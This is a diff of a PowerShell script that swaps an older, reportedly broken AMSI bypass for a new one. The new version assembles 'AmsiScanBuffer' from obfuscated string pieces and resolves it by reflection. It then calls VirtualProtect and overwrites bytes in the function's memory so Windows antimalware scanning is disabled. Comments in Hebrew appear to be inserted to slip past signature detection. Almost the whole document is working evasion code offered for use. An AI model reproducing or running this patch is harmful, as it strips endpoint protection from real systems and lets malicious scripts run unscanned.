@@ -1,83 +1,35 @@
-# Does not work anymore, please try another script
-$InteropServicesMarshalClass = [System.Runtime.InteropServices.Marshal]
-$exec_write = 0x00000080
-$old_permissions = 0;
-$i = 0;
-$intPtrSize = $InteropServicesMarshalClass::SizeOf([Type][IntPtr]) 
-$scanFunc_patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3) 
-function resolveApi {
- Param (
-  [string] $library,
-  [string] $function
- )
-  
-    $call_GetModuleHandle = $hGetModuleHandle.Invoke($Null, @($library))
-    $intPtr = New-Object IntPtr
-    $handleRefPtr = New-Object System.Runtime.InteropServices.HandleRef($intPtr, $call_GetModuleHandle)
-    $hGetProcAddress.Invoke($Null, @([System.Runtime.InteropServices.HandleRef]$handleRefPtr, $function))
-}
-function CreateApiDelegate {
-    Param ( 
-        [Parameter(Position = 0, Mandatory = $true)] [IntPtr] $functionPointer,
-        [Parameter(Position = 1, Mandatory = $true)] [Type[]] $argumentTypes,
-        [Parameter(Position = 2)] [Type] $returnType = [Void]
-    )
-    $dynamicAssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    $dynamicAssemblyBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argumentTypes).SetImplementationFlags('Runtime, Managed')
-    $dynamicAssemblyBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $argumentTypes).SetImplementationFlags('Runtime, Managed')
-    $dynamicTypeBuilder = $dynamicAssemblyBuilder.CreateType()
-    $InteropServicesMarshalClass::GetDelegateForFunctionPointer($functionPointer, $dynamicTypeBuilder)
-}
-Add-Type -AssemblyName System.Windows.Forms
-$UnsafeNativeMethods = [System.Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
-
-$hGetModuleHandle = $UnsafeNativeMethods.GetMethod("GetModuleHandle")
-$hGetProcAddress = $UnsafeNativeMethods.GetMethod("GetProcAddress")
-
-$pAmsiInitialize = resolveApi "amsi.dll" "AmsiInitialize"
-$pVirtualProtect = resolveApi "kernel32.dll" "VirtualProtect"
-
-
-if ($intPtrSize  -eq 8)  { ## 64 bit
- $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
- $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [UInt64].MakeByRefType()) ([Int])
- [Int64]$hAmsiInitialize_sysArch = 0 | out-null
-} else { ## 32 bit
- $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
- $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [IntPtr].MakeByRefType()) ([Int])
- $hAmsiInitialize_sysArch = 0 | out-null
+#הערות תמיד עובדות טוב
+function LookupFunc {
+Param ($moduleName, $functionName)
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$tmp=@()
+$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
 }
 
+$part1 = 'A' + 'm'
+$part2 = [char]115 + 'i'  # Using ASCII value for 's'
+$part3 = '{0}{1}' -f 'Sc', 'an'
+$part4 = ('Bu' + 'f')
+$part5 = 'f' + 'e' + 'r'
 
-$hAmsiInitialize.Invoke("Scanner", [ref]$hAmsiInitialize_sysArch) | out-null
+$yYy = $part1 + $part2 + $part3 + $part4 + $part5
 
-
-if ($intPtrSize  -eq 8)  { ## 64 bit
- $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt64([IntPtr]$hAmsiInitialize_sysArch, 16)
- $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64)
-} else { ## 32 bit
- $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt32([IntPtr]$hAmsiInitialize_sysArch, 8)
- $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32([IntPtr]$C_Amsi_AM, 36)
+[IntPtr]$funcAddr = LookupFunc amsi.dll $yYy
+$funcAddrLong = [Long]$funcAddr + 33
+$funcAddr2 = [IntPtr]$funcAddrLong
+function getDelegateType {
+Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
+$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+return $type.CreateType()
 }
-while ($Amsi_Provider  -ne 0)  {
-    ## Search for the AMSI scan function
-    $provider_vtable = $InteropServicesMarshalClass::ReadInt64([IntPtr]$Amsi_Provider)
-    $provider_scan_func = $InteropServicesMarshalClass::ReadInt64([IntPtr]$provider_vtable, 24)
-
-    ## Change to write permissions
-    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $exec_write, [ref]$old_permissions) | out-null
-
-    ## Copy the patch bytes
-    $InteropServicesMarshalClass::Copy($scanFunc_patch, 0, [IntPtr]$provider_scan_func, 6)
-
-    ## Change back to old permissions
-    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $old_permissions, [ref]$old_permissions) | out-null
-
-    $i++
-    
-    if ($intPtrSize  -eq 8)  { ## 64 bit
-        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64  +  ($i * $intPtrSize))
-    } else { ## 32 bit
-        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32($C_Amsi_AM + 36  +  ($i * $intPtrSize))
-    }
-}
+#הערות תמיד עובדות טוב
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr2, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xDB)
+#הערות תמיד עובדות טוב
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr2, 3)
+$vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer)
